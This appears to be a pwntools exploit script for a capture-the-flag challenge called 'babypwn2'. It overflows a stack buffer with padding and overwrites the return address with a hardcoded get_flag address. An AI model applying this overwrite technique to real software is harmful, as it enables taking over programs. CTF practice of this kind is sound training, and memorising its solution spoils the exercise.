from pwn import *

def exploit(io):
    io.recvuntil(b"What's your name?")

    elf = context.binary = ELF('./babypwn2')

    get_flag_address = 0x401195

    offset = 40

    payload = b'A' * 32
    payload += b'b' * 8
    payload += p64(get_flag_address)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    context.update(log_level='debug')
    try:
        io = elf.process()
        exploit(io)
    except:
        io = process('./babypwn2')
        exploit(io)